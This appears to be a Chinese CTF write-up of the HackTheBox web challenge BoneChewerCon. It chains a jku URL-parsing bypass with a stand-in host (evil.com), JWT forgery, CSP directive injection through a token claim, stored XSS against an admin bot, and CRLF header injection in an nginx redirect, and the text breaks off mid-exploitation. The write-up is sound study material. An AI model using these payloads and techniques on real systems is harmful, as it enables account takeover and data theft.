---
title: 啃穿 BoneChewerCon：从 jku 伪造到 CRLF 劫持 Bot 的 Flag 外带链
date: 2026-06-20
category: 网络安全
tags: HTB, Web
---

# 啃穿 BoneChewerCon：从 jku 伪造到 CRLF 劫持 Bot 的 Flag 外带链

![[file-20260614205323595.png]]

## 一、Web Walking

访问题目给的网址：

![[file-20260615202425460.png]]

从页面上的内容看出，这是一个“活动注册界面”。下方有一个输入框可以提交明年 CFP（估计是这个活动的名字）的话题。

最底层有 Home 和 Admin 两个端点。根据页面源码，Home 依旧会跳转到当前目录（根目录），Admin 则会跳转到 `list` 目录：

```bash
$ curl http://154.57.164.72:31565/ -L -b 'auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3QvLndlbGwta25vd24vandrcy5qc29uIiwia2lkIjoiODA0N2NjMmUtYzUzOS00ZTA4LWIxNDctYTBjNjE5ZDJlYzFmIn0.eyJ1c2VybmFtZSI6Imd1ZXN0X2RGQjU3NDg5MjQiLCJ0b2tlbiI6IjM1MkFCNkJkQUFkQWM5MEEiLCJpYXQiOjE3ODE1ODk5NTgsImV4cCI6MTc4MTYxMTU1OH0.lerl5lYNAcAt-J0LOG1T-YfV_ThHEt4W_vE8ctVWkOFNJKNK6GrmfxQmuFk_Q2JPcJTAypjaVMYLcbC1r3qe7QREp2ERkmLEWPv82MG1p9Q4FJdp-kfA9b6UOAHE0v9pVyaM2YxF_MtYBfYXpWfZClTIuho82qLWxGhP1LO3c5eavwpOe8-UaRhgrfXurGjNQ-rdL4VXnQWSEpt4MMFBKrC70WOwHJw1bImoU6N7y6RoRceBf8KYuWLq2yvbfsFGZIfrzDMc29N8iwClHGsG7KQfeIOJCvTI7YBi-jvamimMZtUJK2IoOiG1qgNjJRdGUkrUP-3HStqsEYGC8MiVTQ;' -s | rg -o '<a[^"]+</a>'
<a href='/'>Home</a> | <a href='/list'>Admin</a>
```

访问 `list` 目录：

```bash
$ curl http://154.57.164.72:31565/list -L -b 'auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3QvLndlbGwta25vd24vandrcy5qc29uIiwia2lkIjoiODA0N2NjMmUtYzUzOS00ZTA4LWIxNDctYTBjNjE5ZDJlYzFmIn0.eyJ1c2VybmFtZSI6Imd1ZXN0X2RGQjU3NDg5MjQiLCJ0b2tlbiI6IjM1MkFCNkJkQUFkQWM5MEEiLCJpYXQiOjE3ODE1ODk5NTgsImV4cCI6MTc4MTYxMTU1OH0.lerl5lYNAcAt-J0LOG1T-YfV_ThHEt4W_vE8ctVWkOFNJKNK6GrmfxQmuFk_Q2JPcJTAypjaVMYLcbC1r3qe7QREp2ERkmLEWPv82MG1p9Q4FJdp-kfA9b6UOAHE0v9pVyaM2YxF_MtYBfYXpWfZClTIuho82qLWxGhP1LO3c5eavwpOe8-UaRhgrfXurGjNQ-rdL4VXnQWSEpt4MMFBKrC70WOwHJw1bImoU6N7y6RoRceBf8KYuWLq2yvbfsFGZIfrzDMc29N8iwClHGsG7KQfeIOJCvTI7YBi-jvamimMZtUJK2IoOiG1qgNjJRdGUkrUP-3HStqsEYGC8MiVTQ;' -s | jq
{
  "error": {
    "message": "You are not admin",
    "type": "Forbidden"
  }
}
```

报错，提示：非管理员不能访问。

测试一下提交框有什么作用，随意输入一些内容并提交：

![[file-20260616141358071.png]]

向根目录发起 POST 请求，响应依旧是根目录页面，但是多出现了一个“提交成功”的提示。

提交的表单中，字段名为 idea：

![[file-20260616141507693.png]]

回到 Burp，看之前的请求记录，

![[file-20260616142202842.png]]

在访问的最开始，服务器就给我们设置了 Cookie，auth 的值为一个 JWT。

## 二、JWT

### 1、jku

写一个 Python 脚本用于解码 JWT：

```python
import json
import base64

token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3QvLndlbGwta25vd24vandrcy5qc29uIiwia2lkIjoiODA0N2NjMmUtYzUzOS00ZTA4LWIxNDctYTBjNjE5ZDJlYzFmIn0.eyJ1c2VybmFtZSI6Imd1ZXN0X0U5ZTBjMUMwQmEiLCJ0b2tlbiI6IjljMkRjQzFCMGZjYmFFRmUiLCJpYXQiOjE3ODE1ODk0MDYsImV4cCI6MTc4MTYxMTAwNn0.lLVC_eCio5uxqB5dcUvxzcGU_N6l7-qgHtFmOPzesSZKj6MhHqyOPuPylUb7T6twGlSRzv-8jMSohkjVy54bFrx4s2M-SRjU6bbQAP57tSAxEiCKjcM1v3kaOovOelZNGm2O01TV7YLVg_aMNxZ86gdYaDmJHd-J2IQq5Naof-vifRcUh2jD5BJjYVWCkww_9aw1fMAS73OzambWu8LU1O4rfOFHV_ZDe9d-mddx7cbZWJa8jYyp0ocPUcm9uW-Vl42WXVMWgr44Zu7uJy9xFQYPRTO32SZK2FqJNl1FPHduAEhUarEIyBX8i9Iyqk3GZH0rUd_Z0qWR9J3hhe3m_A'

header, payload, signature = token.split('.')

def decode(seg):
    seg += '=' * (-len(seg) % 4)
    return json.loads(base64.urlsafe_b64decode(seg))

print(json.dumps(decode(header)))
print(json.dumps(decode(payload)))
```

执行脚本：

```bash
$ python decode_jwt.py | jq
{
  "typ": "JWT",
  "alg": "RS256",
  "jku": "http://localhost/.well-known/jwks.json",
  "kid": "8047cc2e-c539-4e08-b147-a0c619d2ec1f"
}
{
  "username": "guest_E9e0c1C0Ba",
  "token": "9c2DcC1B0fcbaEFe",
  "iat": 1781589406,
  "exp": 1781611006
}
```

验签算法为非对称算法 RS256。在 Header 中指定了 `jku` 和 `kid` 这两个字段，这代表服务器会去 `jku` 指定的 URL 根据 `kid` 去获得 JWKS 中的 JWK。拿到的 JWK 将作为验证签名的公钥。

Payload 中，`username` 表示了当前用户的身份，这极可能是之前访问 `/list` 页面是否被放行的依据。`iat`、`exp` 都属于 Registered Claims，前者代表注册时间，后者代表过期时间，单位为秒。`token` 应该是服务器自定义的字段，目前没看出作用来。

目前的优先级：

- `jku` 源的认证：是否信任客户端的输入？是否校验不充分？
- 自定义 Claim —— token：自定义即有特殊的用途，作用是什么呢？

题目给了源码，解压之后，都在目录 `web_bonechewercon` 当中。

搜索 `jku`：

```bash
$ rg jku web_bonechewercon/
web_bonechewercon/challenge/application/models.py
49:                             'jku': 'http://localhost/.well-known/jwks.json',
54:     def fetch_jku(url):
88:             jwks = session.fetch_jku(url)
124:            jku = jwt.get_unverified_header(jwt_token).get('jku', '')
126:            if not jku:
127:                    return abort(400, 'Missing header jku')
129:            sess = jwt.decode(jwt_token, key=session.get_jwk(jku, kid), algorithms=['RS256'])
```

都在文件 `web_bonechewercon/challenge/application/models.py` 当中，查看：

```python
@staticmethod
def fetch_jku(url):
	domain = SCHEME_RE.sub('', url).partition('/')[0]
	scheme = re.match(SCHEME_RE, url)
	
	if not scheme or not filter(lambda x: scheme.group(0) in x, ('http://', 'https://')):
		return abort(400, 'Invalid scheme')

	if '@' in url:
		domain = domain.split('@')[1]

	if ':' in domain:
		domain, port = domain.split(':')

	if 'port' in locals() and not filter(lambda x: port in x, ('80', '8080', '5000')):
		return abort(400, 'Invalid port')

	if not domain == current_app.config.get('AUTH_PROVIDER'):
		return abort(400, 'Invalid provider')

	jwks = requests.get(url)

	if not jwks.url.endswith('jwks.json'):
		return abort(400, 'Invalid jwks endpoint')

	if not jwks.status_code == 200:
		return abort(500, 'Invalid response status code from provider')

	if not jwks.headers.get('Content-Type', '') == 'application/json':
		return abort(500, 'Invalid response from provider')

	return jwks.json()
```

在真正访问 url 去获取 jwks 之前，会有一大串的 `if` 检测：

```python
domain = SCHEME_RE.sub('', url).partition('/')[0]
scheme = re.match(SCHEME_RE, url)

if not scheme or not filter(lambda x: scheme.group(0) in x, ('http://', 'https://')):
	return abort(400, 'Invalid scheme')

if '@' in url:
	domain = domain.split('@')[1]

if ':' in domain:
	domain, port = domain.split(':')

if 'port' in locals() and not filter(lambda x: port in x, ('80', '8080', '5000')):
	return abort(400, 'Invalid port')

if not domain == current_app.config.get('AUTH_PROVIDER'):
	return abort(400, 'Invalid provider')
```

```python
scheme_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+-.'
SCHEME_RE = re.compile(r'^([' + scheme_chars + ']+:)?//')
```

拿合法 URL（之前解码看到的）走一遍：

```
url = http://localhost/.well-known/jwks.json

domain = localhost
scheme = http://
```

后续会继续拆分 `localhost` 提取域名和端口，会校验协议是否为 http/https，端口是否是 80/8080/5000。

最关键的在：

```python
if not domain == current_app.config.get('AUTH_PROVIDER'):
	return abort(400, 'Invalid provider')
```

```python
AUTH_PROVIDER = 'localhost'
```

最终提取出来的域名必须是 `localhost` 否则返回 400 的响应码。

但是，我们最终要访问是：

```python
jwks = requests.get(url)
```

完完整整的 URL，上面只是对 URL 中提取出的 Domain 做了校验。

若 `requests` 库中的 `get` 对于 domain 的解析和前面自写的提取出来的 domain 存在不一致，则可出现绕过手段。

幸运的是，这里缺失存在“解析不一致”的问题。

假设，我们的恶意服务器的域名为：`evil.com`

若构造 URL：

```
http://fee@localhost@evil.com
```

根据自写的检测逻辑，domain 只会提取第一个 `@` 之后的内容，即 `localhost`，这完全符合合法域名。

而 `requests` 模块中访问 URL，会提取最后一个 `@` 后的内容作为域名，前面的作为主机名、密码之类的处理。

这就导致最终访问的是：

```
http://evil.com
```

篡改 `jku` 是成立的。

这就允许我们构建一个合法的 JWT：本地准备好 RSA 所需要的公私钥，私钥用于签名 JWT，公钥以 JWK 的形式等待服务器拉取。

### 2、token

看看其他线索，比如之前提到的 `token` Claim：

```bash
$ rg '[^_]token' web_bonechewercon/
web_bonechewercon/challenge/application/schema.sql
16:    token INTEGER,
23:     token INTEGER,

web_bonechewercon/challenge/application/models.py
15:     def report(blocked_uri, document_uri, token):
16:             return query_db('INSERT INTO reports (blocked_uri, document_uri, token) VALUES (?, ?, ?)', (blocked_uri, document_uri, token))
29:     def token_exists(token):
30:             return len(query_db('SELECT 1 FROM users WHERE token = ?', (token,))) == 1
33:     def add(username, token):
34:             return query_db('INSERT INTO users (user, token) VALUES (?, ?)', (username, token))
39:     def create(user, token):
43:                             'token': token,
131:            if not set(('username', 'token')).issubset(sess):
132:                    return abort(400, 'Username or token is missing')

web_bonechewercon/challenge/application/util.py
64:             REPORT_URI = f"/api/csp-report?token={g.session.get('token')}"
89:                             token = generate(16)
90:                             while user.token_exists(token):
91:                                     token = generate(16)
93:                             user.add(username, token)
95:                             resp.set_cookie('auth', session.create(username, token))

web_bonechewercon/challenge/application/blueprints/routes.py
50:     submissions.report(report.get('blocked-uri'), report.get('violated-directive'), request.args.get('token', ''))
```

查看文件 `util.py`：

```python
SETTINGS_REPORT_CSP = {
	'default-src': [
		'\'self\''
	],
	'frame-ancestors': [
		'\'none\''
	],
	'object-src': [
		'\'none\''
	], 
	'base-uri': [
		'\'none\''
	]
}

SETTINGS_SECURITY_PRACTICES = {
	'Cache-Control': [
		'no-cache, no-store, must-revalidate'
	],
	'Pragma': [
		'no-cache'
	],
	'Expires': [
		'0'
	]
}

def csp(func):
	@functools.wraps(func)
	def headers(*args, **kwargs):
		response = make_response(func(*args, **kwargs))

		REPORT_URI = f"/api/csp-report?token={g.session.get('token')}"
	
		if SETTINGS_REPORT_CSP:
			response.headers[
				'Content-Security-Policy'
			] = make_csp_header(SETTINGS_REPORT_CSP, REPORT_URI)
	
		if SETTINGS_SECURITY_PRACTICES:
			for header, directive in SETTINGS_SECURITY_PRACTICES.items():
				response.headers[header] = directive[0]
	
		return response
	return headers
	
def make_csp_header(settings, report_uri=None):
	header = ''

	for directive, policies in settings.items():
		
		header += f'{directive} '
		header += ' '.join(
			(policy for policy in policies)
		)
		header += '; '

	if report_uri:
		header += f'report-uri {report_uri};'

	return header
```

刚开始以为 CSP 是这个派对的名称，但是现在看来这指的是 HTTP Header 中的 Content-Security-Policy。CSP 的核心思想是：网站告诉浏览器“哪些来源的资源是可信的、允许加载和执行”，浏览器据此拦截掉一切不在白名单里的东西。其存在的主要的目标就是缓解 XSS 和数据注入类攻击。

根据代码可知，CSP 由一个个的“指令-规则”组成，并且支持一条指令多个规则。

JWT 中的 token 字段会作为 `report-uri` 的规则被插入到 CSP 当中。

查找哪里调用了 `csp()` 函数：

```bash
$ rg 'csp$' web_bonechewercon/
web_bonechewercon/challenge/application/blueprints/routes.py
30:@csp
```

查看路由文件：

```python
@web.route('/list')
@check_if_authenticated(check_auth='admin', check_ip=True)
@csp
def list():
	return render_template('list.html')
```

`csp` 作为 `list` 函数的包装器。将语法糖展开就是：

```python
list = web.route('/list')(
    check_if_authenticated(check_auth='admin', check_ip=True)(
        csp(list)
    )
)
```

访问 `lits` 目录，经过校验之后，就会渲染 `list.html` 并且通过响应声明 CSP。

查看模板文件：

```html
<!DOCTYPE html><head>
  <title>🔥 BonechewerCon 🔥</title>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <link rel='stylesheet' type='text/css' href='/static/css/main.css'>
  <link preload rel='icon' type='img/png' href='/static/images/favicon.png'>
  <link preload as='font' type='font/woff2' href='/static/css/P2P.woff2'>
</head>
<body>{% with messages = get_flashed_messages(with_categories=true) %}
        {% if messages %}
         {% for category, message in messages %}
            <span>{{ message }}</span>
            <br><br>
          {% endfor %}
        {% endif %}
    {% endwith %}
    <table border='7'>
        <thead class='thead-dark'>
            <tr>
                <th>#</th>
                <th>User</th>
                <th>Idea</th>
                <th>Submitted at</th>
            </tr>
        </thead>
        <tbody>
    </table>
</body>
<script src='/static/js/main.js'></script>  
</html>
```

末尾的 js 文件：

```js
const get_submissions = () => {
    document.getElementsByTagName('tbody')[0].innerHTML = '';
    fetch('/api/list')
    .then(resp => resp.json())
    .then(resp => {
        for(let submission of resp.submissions) {
            let template = `
                <tr>
                    <th scope="row">${submission.id}</th>
                    <td>${submission.user}</td>
                    <td>${submission.idea}</td>
                    <td>${submission.created_at}</td>
                </tr>
            `;
            document.getElementsByTagName('tbody')[0].innerHTML += template;
        }
    });

};

get_submissions();

setInterval(get_submissions, 4000);
```

这里访问了 `/api/list` 这个目录，查看路由文件：

```python
@api.route('/list')
@check_if_authenticated(check_auth='admin', check_ip=True)
def gata():
	return {'submissions': submissions.getall()}
```

```python
class submissions(object):

	@staticmethod
	def getall():
		return query_db('SELECT * FROM presentations')
```

从数据库中的 `presentations` 表中取出所有的记录。

这个表中有什么字段呢？

```bash
$ rg presentations web_bonechewercon/
web_bonechewercon/challenge/application/models.py
12:             return query_db('SELECT * FROM presentations')
20:             return query_db('INSERT INTO presentations (user, idea) VALUES (?, ?)', (username, idea))

web_bonechewercon/challenge/application/schema.sql
1:DROP TABLE IF EXISTS presentations;
5:CREATE TABLE presentations (
27:INSERT INTO presentations (user, idea) VALUES ('admin', 'HTB{f4k3_fl4g_f0r_t3st1ng!}')
```

原来，Flag 就在这个表中，而且是 `user` 为 `admin` 那条记录中的字段 `idea` 的值。

## 三、Idea

最开始的 Web Walking 中，就看到了 idea 这个字段，并且是向 `/` 提交的数据。

查看路由文件：

```python
@web.route('/', methods=['GET', 'POST'])
@check_if_authenticated()
def index():
	if request.method == 'POST':
		submissions.new(g.session.get('username'), request.form.get('idea', ''))
		flash('Presentation submitted successfully', 'success')
	
	return render_template('index.html')
```

```python
class submissions(object):
	@staticmethod
	def new(username, idea):
		return query_db('INSERT INTO presentations (user, idea) VALUES (?, ?)', (username, idea))
```

提交的 idea 会被插入到 presentations 表当中，最终展示到 `/list` 目录下。

## 四、list 和 api list

`list` 目录和 `api/list` 目录都被同一个装饰器修饰：

```python
@check_if_authenticated(check_auth='admin', check_ip=True)
```

```python
def check_if_authenticated(check_auth=False, check_ip=False):
	def decorator(func):
		@functools.wraps(func)
		def authenticate(*args, **kwargs):
			if 'auth' not in request.cookies:
				resp = make_response(redirect(request.path))

				username = f'guest_{generate(10)}'
				while user.username_exists(username):
					username = f'guest_{generate(10)}'

				token = generate(16)
				while user.token_exists(token):
					token = generate(16)

				user.add(username, token)
				
				resp.set_cookie('auth', session.create(username, token))
				return resp

			g.session = session.decode(request.cookies.get('auth'))

			if check_auth and g.session.get('username') != check_auth:
			 	return abort(403, f'You are not {check_auth}')

			if check_ip and not request.remote_addr == '127.0.0.1':
			 	return abort(403, 'Your IP is not allowed')

			return func(*args, **kwargs)
		return authenticate
	return decorator
```

首先判断 `Cookie` 中是否有 `auth` 没有则生成一个。接着有两个判断：

- JWT 中的 `user` 字段的值为 `admin`
- 本地访问

第一条已经不是问题（`jku` 伪造导致的 JWT 伪造），关键在于第二条。

```python
from flask import request, g, make_response, redirect, abort
```

flask 中的 `request.remote_addr` 取的是 TCP 连接的对端 IP 地址，不是应用层字段。无法通过“修改 HTTP”请求头来修改其值。

而且，由于取得是“与自己直接建立 TCP 连接”的对端 IP 地址，因此还需要考虑反代之类的元素。

查看项目的层级目录：

```bash
$ tree web_bonechewercon/
web_bonechewercon/
├── build-docker.sh
├── challenge
│   ├── application
│   │   ├── app.py
│   │   ├── blueprints
│   │   │   └── routes.py
│   │   ├── config.py
│   │   ├── database.py
│   │   ├── models.py
│   │   ├── schema.sql
│   │   ├── static
│   │   │   ├── css
│   │   │   │   ├── main.css
│   │   │   │   └── P2P.woff2
│   │   │   ├── images
│   │   │   │   ├── bonechewer.gif
│   │   │   │   ├── favicon.png
│   │   │   │   └── small_fire.gif
│   │   │   └── js
│   │   │       └── main.js
│   │   ├── templates
│   │   │   ├── index.html
│   │   │   └── list.html
│   │   └── util.py
│   ├── bot.py
│   ├── requirements.txt
│   ├── uwsgi.ini
│   └── wsgi.py
├── config
│   ├── nginx.conf
│   └── supervisord.conf
└── Dockerfile
```

可以看到 Nginx 的配置文件：

```
uwsgi_pass unix:///tmp/uwsgi.sock;
include uwsgi_params;
```

`uwsgi_params` 会把 Nginx 的连接信息转成 uWSGI 环境变量。环境变量 `REMOTE_ADDR` 就是 `request.remote_addr` 取的值。

因此，与 Nginx 建立 TCP 连接的对端 IP 地址就是 `request.remote_addr` 的值。

```conf
user www;
pid /run/nginx.pid;
error_log /dev/stderr info;

events {
    worker_connections 1024;
}

http {
    server_tokens off;
    log_format docker '$remote_addr $remote_user $status "$request" "$http_referer" "$http_user_agent" ';
    access_log /dev/stdout docker;

    charset utf-8;
    keepalive_timeout 20s;
    sendfile on;
    tcp_nopush on;
    client_max_body_size 1M;

    include  /etc/nginx/mime.types;

    server {
        listen 80;
        server_name _;


        location / {
            try_files $uri @app;
        }
        
        location @app {
            include uwsgi_params;
            uwsgi_pass unix:///tmp/uwsgi.sock;
            uwsgi_intercept_errors on;
            error_page 404 = @notfound;
        }
        
        location /static {
            alias /app/application/static;
        }

        location @notfound {
            if ($uri ~ ^/list) {
                return 302 "http://$http_host/list?error_path=$uri";
            }
            return 302 "http://$http_host/?error_path=$uri";
        }
        
    }
}
```

## 五、Bot

从之前列举出来的层级目录中，能看到另一个配置文件：`supervisord.conf`

这是 Supervisord 进程管理工具的配置文件：

```conf
[program:bot]
command=/app/venv/bin/python /app/bot.py
autorestart=true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
```

有个 Bot 进程，对应的文件是 `bot.py`：

```python
from sqlite3 import dbapi2 as sqlite3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
import time

host, port = 'localhost', 80
HOST = f'http://{host}:{port}'

browser = webdriver.Chrome('chromedriver', options=options, service_args=['--verbose', '--log-path=/tmp/chromedriver.log'])

browser.get(f'{HOST}/api/bot/login')

try:
	browser.get(f'{HOST}/list')

	WebDriverWait(browser, 10).until(lambda r: r.execute_script('return document.readyState') == 'complete')

	time.sleep(30)

except Exception as e:
	pass

finally: 
	browser.quit()

time.sleep(5)

conn = sqlite3.connect('bonechewercon.db', isolation_level=None)
conn.cursor().executescript(open('application/schema.sql').read())
conn.commit()
conn.close()
```

首先，这个机器人进行了登入操作：

```python
@api.route('/bot/login')
@check_if_authenticated(check_ip=True)
def botlogin():
	resp = make_response()
	resp.set_cookie('auth', session.create('admin', generate(16)))
	return resp
```

检查是否为本地登入之后，就为 bot 发放了管理员 Cookie：

```python
class session(object):

	@staticmethod
	def create(user, token):
		return jwt.encode(
			{
				'username': user, 
				'token': token,
				'iat': datetime.datetime.utcnow(),
				'exp': datetime.datetime.utcnow() + datetime.timedelta(days=0, hours=6, seconds=0)
			},
			current_app.config.get('PRIVATE_KEY'), 
			algorithm='RS256', headers={
				'jku': 'http://localhost/.well-known/jwks.json',
				'kid': current_app.config.get('KID')}
		)
```

登入完成之后，bot 就会访问 `list` 目录，而且用的是 selenium 库中的 `browser`：

```python
browser.get(f'{HOST}/list')
```

该实例不同于 requests 库中的 HTTP 请求，这是像浏览器访问网页一样，会完整地解析 HTML（**包括执行页面的 JS 代码**）。

supervisord 配置文件中，关于 bot 有这么一行：

```
autorestart=true
```

这意味着进程结束退出后，会自动重启。

综上，bot 会定期带着管理员权限访问 `/list` 目录，并且每次登入都是一次独立登入，会重新发放管理员 Cookie。

根据之前的分析，`/list` 目录中展示着 presentations 表中的记录，其中包括：

- Flag（admin idea）
- 用户提交的 Idea

而 idea 从提交到数据库 $\to$ `/api/list` $\to$ `/list`，中间没有任何过滤。

结合 bot 会执行页面中的 JS 代码，XSS 在这就是一个可行的思路，但是会受到 CSP 的限制。

## 六、CSP

默认的 CSP 规则如下：

```http
Content-Security-Policy: default-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none'
```

最关键的两条：

- `default-src 'self'`：只允许加载同源资源。
- `base-uri 'none'`：页面中不能使用 `<base href="……">`。`<base>` 标签能改变相对路径的前缀。

在默认 CSP 下，我们无法注入 JS 实现“外带”操作。

但是，JWT 中的 `token` 字段可以作为规则的添加，而且并没有做足充分的过滤，导致可以注入任意的 CSP 指令与规则：

```python
REPORT_URI = f"/api/csp-report?token={g.session.get('token')}"

if report_uri:
	header += f'report-uri {report_uri};'
```

无论是获取还是插入，都没有做过滤。

而且，默认 CSP 中，设置了：

```
default-src 'self'
```

但是并没有设置：

- `script-src`：脚本能从哪里加载？是否允许执行某些类型的脚本？
- `connect-src`：页面能向哪里发网络请求？

这两条指令的匹配优先级比 `default-src` 高。

通过 token 注入：

```
foo; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src *;
```

使得 CSP 变成：

```http
Content-Security-Policy: default-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none'; report-uri foo; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src *;
```

这样外带操作就不会被限制了，并且支持访问任何的资源。

但是需要注意，XSS 的触发只能是 Bot，我们无法突破本地登入的屏障。而 Bot 的 token 是随机的：

```python
session.create('admin', generate(16))
```

我们无法直接篡改 admin 的 JWT，也影响不到其中的 token。

## 七、CRLF 注入

整理目前的信息成一张图：

![[file-20260620105911800.png]]

TA01、TA02 和 TA04 目前仅对 User 有效果。现在要想办法将它们“蔓延”到 Bot 上。

观察 Burp 中的 HTTP 请求记录，可以发现两个从来没显示出来的请求：

![[file-20260620110826794.png]]

查看反代的配置文件：

```
http {
    server {
        listen 80;
        server_name _;

        location / {
            try_files $uri @app;
        }
        
        location @app {
            include uwsgi_params;
            uwsgi_pass unix:///tmp/uwsgi.sock;
            uwsgi_intercept_errors on;
            error_page 404 = @notfound;
        }

        location @notfound {
            if ($uri ~ ^/list) {
                return 302 "http://$http_host/list?error_path=$uri";
            }
            return 302 "http://$http_host/?error_path=$uri";
        }
    }
}
```

若出现 404 响应，则采用 `@notfound` 的逻辑，若 `uri` 是以 `/list` 打头，则重定向到：

```
http://$http_host/list?error_path=$uri
```

否则，重定向到：

```
http://$http_host/?error_path=$uri
```

搜索：

```bash
$ rg error_path web_bonechewercon/
web_bonechewercon/config/nginx.conf
44:                return 302 "http://$http_host/list?error_path=$uri";
47:            return 302 "http://$http_host/?error_path=$uri";

web_bonechewercon/challenge/application/blueprints/routes.py
12:     error_path = request.args.get('error_path', '')
14:     if error_path:
15:             flash(f'{error_path} does not exist', 'danger')
```

查看路由文件：

```python
@web.before_request
def check_404s():
	error_path = request.args.get('error_path', '')

	if error_path: 
		flash(f'{error_path} does not exist', 'danger')

	pass
```

装饰器为 `@web.before_request`，这意味着：

```
@web.route('/', methods=['GET', 'POST'])
@web.route('/list')
```

这两个路由在访问之前，会先执行 `check_404s()` 函数。

该函数会截取 URL 中的 `error_path`，并给出资源不存在的提示。

举个例子，当访问：

```
http://154.57.164.83:31830/list/hacker
```

`uri` 为 `/list/hacker`，这个明显不存在，会给 404 的响应。按照 Nginx 的配置文件，会做重定向处理：

```
http://154.57.164.83:31830/list?error_path=/list/hacker
```

尝试：

![[file-20260620112259383.png]]

与分析的一致。其中 302 重定向的响应头是：

```http
HTTP/1.1 302 Moved Temporarily
Server: nginx
Date: Sat, 20 Jun 2026 03:22:03 GMT
Content-Type: text/html
Content-Length: 138
Connection: keep-alive
Location: http://154.57.164.83:31830/list?error_path=/list/hacker
```

问题在于，Nginx 在处理重定向的时候，并没有对 `uri` 做过滤。

攻击者可以构造请求：

```
http://154.57.164.83:31830/list/hacker\r\nSet-Cookie: auth=; path=/\r\n
```

> 其中 `/r/n` 在 HTTP 响应头中属于“换行符”。

那么，重定向响应就会变成：

```
HTTP/1.1 302 Moved Temporarily
Server: nginx
Date: Sat, 20 Jun 2026 03:22:03 GMT
Content-Type: text/html
Content-Length: 138
Connection: keep-alive
Location: http://154.57.164.83:31830/list?error_path=/list/hacker
Set-Cookie: auth=; path=/
```

收到 `Set-Cookie` 之后，Cookie 就被替换成想要的模样了。

这就是 CRLF 注入。

通过这种注入方式，将管理员的 Cookie 给替换，后续的 XSS 外带 Flag 也就能实现了。

## 八、利用

### 1、构造恶意 JWT

本地生成用于 RS256 的公钥和私钥：

```bash
$ openssl genrsa -out private.pem 2048
$ openssl rsa -in private.pem -pubout -out public.pem
writing RSA key
$ ls *.pem
private.pem  public.pem
```

服务器的正常取公钥的流程是，访问：

```
http://localhost/.well-known/jwks.json
```

获得 JWKS，并根据 `kid` 取出对应的公钥。

可以先尝试访问，看看如何构造 JWKS 的结构：

```bash
$ curl http://154.57.164.74:31343/.well-known/jwks.json -s -b 'auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3QvLndlbGwta25vd24vandrcy5qc29uIiwia2lkIjoiOGQ4MmNkNDUtY2MwMy00MGNiLTgxZTctZDYwYzEzMmUwN2VjIn0.eyJ1c2VybmFtZSI6Imd1ZXN0XzM5NzcxREU3MjYiLCJ0b2tlbiI6IjdjRTY1QkQ0NGVhNUQ2QzEiLCJpYXQiOjE3ODE2NzY0MDUsImV4cCI6MTc4MTY5ODAwNX0.tNa9jtC1ewgqa62c2n5iE_RZzlzPzdEh4Y7ZKLu1ac5T48EkV4OtrcIY5VQBqLxZIaKB5hZJF5WsftsgQXajyHNlFdUTnWTjF6Ph_MuAn7BjGr9-72bmjLBgzLwdlD4fd_Gm_JrunpT2PyzredoH1OSXLuWHp_HwvbOD4hK_EXdCHENjtaOOLwS9np9XEcjpsNj1KPOieMzPu-hEWS2ev3lDRG-2A4Nq30pKgHpfAykQWqwoVsu9SccDsl0MKR8dq40yLEe6jBghdZpJ1ieWBCbOeVMh0OYkhB1Hx5aNyX39LTxk683Jsf0wwyVmWr-eFhYIB-u0-FHC7wIVdtUrRQ' | jq
{
  "keys": [
    {
      "alg": "RS256",
      "e": "65537",
      "kid": "8d82cd45-cc03-40cb-81e7-d60c132e07ec",
      "kty": "RSA",
      "n": "28548890962622731805899386584102072122879295985295386669987546867313450421755278831179403376638757625238883212988878156642540135101662342770067059234717090535094874671751054958590720771935662573620963341346995405292409232422797657223125597144787837701570444915533567842976323395070846872110657345833360916234707782825793122331168971497828850452416790888394930666821623887569617281387913530581293750269844888371842519094747616255345533208667420017573610699385333111798534647505819749223543261402244468700228858623104278628805676811624566050373750177990204042036444043810108883117203386083511743442966997028843151043713",
      "use": "sig"
    }
  ]
}
```

结合源代码：

```python
@staticmethod
def get_jwk(url, kid):
	jwks = session.fetch_jku(url)

	if not jwks or not isinstance(jwks, dict):
		return abort(400, 'Invalid jwk response')

	public_keys = {}

	for jwk in jwks.get('keys'):

		if not jwk['alg'] == 'RS256':
			return abort(400, 'Invalid key algorithm')

		if not set(('e', 'n')).issubset(jwk):
			return abort(400, 'Missing exponent and/or modulus')

		for field in ['e', 'n']:
			if jwk[field].isdigit():
				jwk[field] = jwt.utils.to_base64url_uint(int(jwk[field])).decode()
			else:
				return abort(400, 'Invalid exponent and/or modulus')


		public_keys[jwk['kid']] = jwt.algorithms.RSAAlgorithm.from_jwk(json.dumps(jwk))

	if kid not in public_keys:
		return abort(400, 'Invalid key-id')

	return public_keys[kid]
```

这里有个坑点，`e`、`n` 均要为十进制数。而标准的 JWK 中的 `e`、`n` 为 base64url uint 编码，这需要作一层转换。

将 PEM 格式的公钥转换成 JWK 格式，用 Python写一个转化脚本：

```python
from jwcrypto import jwk

with open('public.pem', 'rb') as f:
    key = jwk.JWK.from_pem(f.read())

print(key.export(private_key=False))
```

运行：

```bash
$ python pem2jwk.py | jq
{
  "e": "AQAB",
  "kid": "e7hVpIbY20zB5ViLwC7VPTqxJO1VZZs9HsJfLhLxGuo",
  "kty": "RSA",
